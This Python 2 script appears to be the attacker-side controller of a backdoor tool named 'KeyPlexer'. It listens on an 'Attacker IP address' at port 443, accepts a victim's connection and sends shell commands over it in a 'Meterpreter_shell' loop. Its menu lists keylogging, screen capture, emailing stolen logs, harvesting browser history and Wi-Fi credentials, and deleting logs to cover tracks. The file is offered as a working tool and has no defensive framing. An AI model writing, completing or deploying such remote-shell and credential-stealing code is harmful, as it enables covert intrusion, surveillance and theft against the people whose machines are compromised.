#!/usr/bin/python

import subprocess 
import socket
import time
import sys

""" This module for creating quick backdoors
    servers
    TODO The backdoor uses username and password for protection purposes
    """

def banner():
  print  """
            Name:
            Date :
            Version : v2.0
             _  __             ____   _                        
            | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
            | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
            | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
            |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
                        |___/
                        
                      ooo,    .---.
                     o`  o   /    |\________________
                    o`   'oooo()  | ________   _   _)
                    `oo   o` \    |/        | | | |
                      `ooo'   `---'         "-" |_|
            """

host = '10.0.0.251' # Attacker IP address
port = 443 # Port number in which the attacker server listen to


def menu():
  """This is the program menu"""

  print "[*] Command options: "
  print 
  print "[*] Keylog         ========= > Start capturing keystrokes" #DONE
  print "[*] Openwins       ========= > Get all the open program windows on the machine" #DONE
  print "[*] Capture        ========= > take images of the host machine "
  print "[*] Sendlogs       ========= > Sending logs and images by email"
  print "[*] History        ========= > Gathers all browsers history"
  print "[*] Wifi           ========= > Get Wi-Fi credentials "
  print "[*] Connection     ========= > Get the connection status up/down"
  print "[*] SystemInfo     ========= > Get Fingerprint of the system"
  print "[*] IP             ========= >  Get the external IP address" #DONE
  print "[*] Cover          ========= > Delete all traces of logs"
  print "\n\n"
  
  

  
def backdoor_shell():
    
    global host, port
    
    # create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # bind socket to the host address and port number
    sock.bind((host,port))

    # define the maximun number of connection
    sock.listen(10)

    # accept client connetion
    client_conn, addr = sock.accept()


    #banner() # program banner
    #print "[+] Connection has established from %s" % (str(addr[0]))
    #print "[+] Listening on port %d" % port


    # run while loop to initiate the resverse connection
    while True:

        # shell command to be executed
        user_command = raw_input("$Meterpreter_shell: >>> ")

        # check for ":kill" to quit the shell
        if user_command == ":kill":
            
            # if the command is equal to ":kill", break
             client_conn.send(":kill")
             print "[+] Shell is shutting down ..............."
             client_conn.close()
             break

        else:
            # send the command to the user machine
            client_conn.send(user_command)

            # print the output 
            print client_conn.recv(1024)
            

def main():
    banner()
    menu()
    #backdoor_shell()


main()
